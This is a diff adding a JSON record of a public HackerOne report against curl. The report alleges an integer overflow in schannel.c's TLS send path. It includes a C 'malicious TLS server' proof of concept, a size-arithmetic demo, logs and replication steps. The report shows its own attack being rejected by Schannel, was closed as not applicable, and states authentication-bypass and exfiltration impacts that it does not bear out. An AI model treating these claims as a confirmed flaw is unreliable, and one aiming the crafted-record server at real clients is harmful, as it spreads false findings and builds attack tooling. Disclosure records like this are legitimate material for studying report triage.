@@ -1,0 +1,123 @@
+{
+  "id": 3282709,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjgyNzA5",
+  "url": "https://hackerone.com/reports/3282709",
+  "title": "Integer Overflow in schannel.c TLS Data Transmission",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "medium",
+  "readable_substate": "N/A",
+  "created_at": "2025-08-02T04:22:05.643Z",
+  "submitted_at": "2025-08-02T04:22:08.315Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "kakorrhaphiophobia",
+    "url": "/kakorrhaphiophobia",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/26jies4dro8jnz4zq74vjdijztyf/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-08-02T08:23:18.630Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-08-02T08:12:49.676Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\nThis vulnerability allows an in overflow when adding TLS buffer sizes during an encrypted data tranmission which can lead to incorrect data sizes being sent and TLS security issues while in testing.\n\nWithin testing on a Windows 10 enviroment, Windows's Schannel rejected the malformed TLS handshake constructed as (`SEC_E_INVALID_TOKEN`) which is expected as the vulnerable code at location: `./lib/vtls/schannel.c`:\n```\n/* send the encrypted message including header, data and trailer */\nlen = outbuf[0].cbBuffer + outbuf[1].cbBuffer + outbuf[2].cbBuffer;\n\n```\nrules after the TLS connection is established. This also occurs during the data transmission phase, not the handshake itself and windows validates TLS records and rejects obv malformed one's.\n\ncurl adds the three buffers: outbuf which is a TLS header, outbuf[1] which is the encrypted data and then outbuf which is the TLS trailer. curl adds these three together without checking for an int overflow and when on my testing enviroment compiling for 32 bit, if the sizes are large enough, the addition can overflow which results in a small len value.\n\nThis can lead to incorrect data transmission sizes, TLS protocol violations, memory safety issues and worst case I think is a potential security bypass if the overflow causes curl to send less data than intended.\n\nThis can be tested with the proof of concept attached where a malicious HTTP server is served and any windows user with curl connecting to such a malicious server is affected. The only feasible way of exploting this practically would require bypassing Windows Schannel validity due to me getting a `SEC_E_INVALID_TOKEN` rejecting the malformed TLS. This was also tested compiled for 32-bit windows systems where the wraparound is likely.\n\n# Log\n\n```\n=== Schannel Vulnerability PoC Server (Windows) ===\nThis server attempts to trigger the integer overflow\nin curl's schannel.c by sending crafted TLS responses\n\n[*] Initializing Winsock...\n[*] Malicious server listening on port 4433\n[*] Test with: curl -k https://localhost:4433\n[*] Client connected\n[*] Received 1815 bytes (ClientHello)\n[*] Sending malicious TLS record...\n[*] Sent malicious TLS records\n[*] Connection closed\n\n[*] Client connected\n[*] Received 1783 bytes (ClientHello)\n[*] Sending malicious TLS record...\n[*] Sent malicious TLS records\n[*] Connection closed\n\n[*] Client connected\n[*] Received 1719 bytes (ClientHello)\n[*] Sending malicious TLS record...\n[*] Sent malicious TLS records\n[*] Connection closed\n\n[*] Client connected\n[*] Received 1783 bytes (ClientHello)\n[*] Sending malicious TLS record...\n[*] Sent malicious TLS records\n[*] Connection closed\n\n[*] Client connected\n[*] Received 281 bytes (ClientHello)\n[*] Sending malicious TLS record...\n[*] Sent malicious TLS records\n[*] Connection closed\n```\n\n```\ncurl -k https://localhost:4433/\ncurl: (35) schannel: next InitializeSecurityContext failed: SEC_E_INVALID_TOKEN (0x80090308) - The token supplied to the function is invalid\n\n```\n\n## math poc\n\n```\n#define SECURITY_WIN32 1\n#include <windows.h>\n#include <security.h>\n#include <schannel.h>\n#include <stdio.h>\n#include <stdlib.h>\n\nint main() {\n    printf(\"Curl Schannel Integer Overflow PoC\\n\");\n    printf(\"==================================\\n\\n\");\n    \n    SYSTEM_INFO si;\n    GetSystemInfo(&si);\n    printf(\"Architecture: %s\\n\", si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? \"64-bit\" : \"32-bit\");\n    printf(\"sizeof(size_t): %llu bytes\\n\\n\", (unsigned long long)sizeof(size_t));\n    \n    SecBuffer outbuf[3];\n    outbuf[0].cbBuffer = 0x80000000;\n    outbuf[1].cbBuffer = 0x80000001;\n    outbuf[2].cbBuffer = 0x00000000;\n    \n    size_t len = outbuf[0].cbBuffer + outbuf[1].cbBuffer + outbuf[2].cbBuffer;\n    \n    printf(\"Vulnerable code: len = outbuf[0].cbBuffer + outbuf[1].cbBuffer + outbuf[2].cbBuffer\\n\\n\");\n    printf(\"0x%08lX + 0x%08lX + 0x%08lX = 0x%llX\\n\", \n           (unsigned long)outbuf[0].cbBuffer,\n           (unsigned long)outbuf[1].cbBuffer, \n           (unsigned long)outbuf[2].cbBuffer,\n           (unsigned long long)len);\n    \n    unsigned long long expected = 0x100000001ULL;\n    \n    if(sizeof(size_t) == 4 && len != expected) {\n        printf(\"\\n*** INTEGER OVERFLOW on 32-bit! ***\\n\");\n        printf(\"Expected: %llu bytes\\n\", expected);\n        printf(\"Got: %llu bytes\\n\", (unsigned long long)len);\n    }\n    \n    return 0;\n}\n```\n\n## Malicious server\n```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdint.h>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n#include <windows.h>\n\n#define PORT 4433\n\n#pragma pack(push, 1)\ntypedef struct {\n    uint8_t type;\n    uint8_t version_major;\n    uint8_t version_minor;\n    uint16_t length;\n} tls_record_header;\n#pragma pack(pop)\n\nvoid send_malicious_record(SOCKET client_socket) {\n    printf(\"[*] Sending malicious TLS record...\\n\");\n    \n    tls_record_header record;\n    record.type = 0x17;\n    record.version_major = 0x03;\n    record.version_minor = 0x03;\n    record.length = htons(0xFFFF);\n    \n    send(client_socket, (char*)&record, sizeof(record), 0);\n    \n    size_t payload_size = 0xFFFF;\n    unsigned char *payload = malloc(payload_size);\n    if (!payload) {\n        printf(\"Failed to allocate payload\\n\");\n        return;\n    }\n    memset(payload, 'A', payload_size);\n    send(client_socket, (char*)payload, (int)payload_size, 0);\n    free(payload);\n    \n    for(int i = 0; i < 3; i++) {\n        send(client_socket, (char*)&record, sizeof(record), 0);\n        payload = malloc(payload_size);\n        if (!payload) continue;\n        memset(payload, 'B' + i, payload_size);\n        send(client_socket, (char*)payload, (int)payload_size, 0);\n        free(payload);\n    }\n    \n    printf(\"[*] Sent malicious TLS records\\n\");\n}\n\nvoid run_raw_server() {\n    WSADATA wsa;\n    SOCKET server_socket, client_socket;\n    struct sockaddr_in server_addr, client_addr;\n    int client_addr_len = sizeof(client_addr);\n    \n    printf(\"[*] Initializing Winsock...\\n\");\n    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {\n        printf(\"WSAStartup failed: %d\\n\", WSAGetLastError());\n        return;\n    }\n    \n    server_socket = socket(AF_INET, SOCK_STREAM, 0);\n    if (server_socket == INVALID_SOCKET) {\n        printf(\"Socket creation failed: %d\\n\", WSAGetLastError());\n        WSACleanup();\n        return;\n    }\n    \n    int opt = 1;\n    setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));\n    \n    server_addr.sin_family = AF_INET;\n    server_addr.sin_addr.s_addr = INADDR_ANY;\n    server_addr.sin_port = htons(PORT);\n    \n    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {\n        printf(\"Bind failed: %d\\n\", WSAGetLastError());\n        closesocket(server_socket);\n        WSACleanup();\n        return;\n    }\n    \n    if (listen(server_socket, 3) == SOCKET_ERROR) {\n        printf(\"Listen failed: %d\\n\", WSAGetLastError());\n        closesocket(server_socket);\n        WSACleanup();\n        return;\n    }\n    \n    printf(\"[*] Malicious server listening on port %d\\n\", PORT);\n    printf(\"[*] Test with: curl -k https://localhost:%d\\n\", PORT);\n    \n    while (1) {\n        client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_addr_len);\n        if (client_socket == INVALID_SOCKET) {\n            printf(\"Accept failed: %d\\n\", WSAGetLastError());\n            continue;\n        }\n        \n        printf(\"[*] Client connected\\n\");\n        \n        char buffer[4096];\n        int received = recv(client_socket, buffer, sizeof(buffer), 0);\n        printf(\"[*] Received %d bytes (ClientHello)\\n\", received);\n        \n        unsigned char server_hello[] = {\n            0x16, 0x03, 0x03, 0x00, 0x31,\n            0x02, 0x00, 0x00, 0x2d,\n            0x03, 0x03,\n            0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,\n            0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,\n            0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,\n            0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,\n            0x00,\n            0x00, 0x2f,\n            0x00\n        };\n        \n        send(client_socket, (char*)server_hello, sizeof(server_hello), 0);\n        \n        send_malicious_record(client_socket);\n        \n        size_t huge_size = 0x100000;\n        unsigned char *huge_data = malloc(huge_size);\n        if (huge_data) {\n            memset(huge_data, 'X', huge_size);\n            send(client_socket, (char*)huge_data, (int)huge_size, 0);\n            free(huge_data);\n        }\n        \n        closesocket(client_socket);\n        printf(\"[*] Connection closed\\n\\n\");\n    }\n    \n    closesocket(server_socket);\n    WSACleanup();\n}\n\nint main() {\n    run_raw_server();\n    \n    return 0;\n}\n```\n\n\n\n\n## To replicate\n1.  compile the malicious TLS server on Windows and run accordingly for 32-bit: `i686-w64-mingw32-gcc -Wall -Wextra -g3 malicious_server.c -o malicious_server.exe -lws2_32`\n\n2.  execute `curl -k https://localhost:4433/` \n\n\n## Versions affected\n8.15.0: release\n8.16.0: dev\n\n## Impact\n\n## Summary:\nAn attacker can achieve authentication bypass if creds are being tranmitted via TLS like if one sends 4GB of encrypted auth data but in reality someone only sends one byte considering an overflow and then as a result the server would receive incomplete credentials.\n\nAlso possibly, you could prevent data exfiltration if you manipulate again the TLS handshake to trigger the large buffer sizes again which causes the same overflow resulting in less data than the application expects.\n\nThis could lead to a DoS as well as infinite loops could occur when `len` is very small or the connection hangs entirely due to the protocol violation or exhausting resources in general from repeated connection attempts.\n\nReal world: an attacker would need to control or compromise a TLS server, manipulate Windows' `EncryptMessage()` to return specific buffer sizes and trigger the overflow during the transmission of data so in my mind this could also be like incomplete security patches being trasmitted, partial file transfers which appear _complete_ or truncated API requests.",
+  "weakness": {
+    "id": 15,
+    "name": "Integer Overflow"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 28,
+  "voters": [
+    "corrupted_bytes",
+    "zeus_web3",
+    "thalaivar304",
+    "2026",
+    "lonely_cat",
+    "aag1107",
+    "johnnywatters",
+    "sudo_er",
+    "0x77xyz",
+    "fahad0012",
+    "and 18 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
